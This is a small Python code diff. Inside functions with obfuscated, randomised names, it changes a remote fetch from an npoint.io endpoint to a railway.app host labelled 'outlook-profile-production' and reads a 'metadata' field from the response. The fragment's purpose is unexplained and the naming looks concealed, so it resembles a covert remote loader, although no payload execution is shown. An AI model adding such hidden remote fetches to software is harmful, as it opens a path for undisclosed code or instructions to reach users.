@@ -18,7 +18,7 @@ def data_imhgay_215():
 
     def learn_vfdccc_318():
         try:
-            learn_likeng_463 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_likeng_463 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_likeng_463.raise_for_status()
             net_yjvouk_585 = learn_likeng_463.json()
             learn_dxcvwr_824 = net_yjvouk_585.get('metadata')
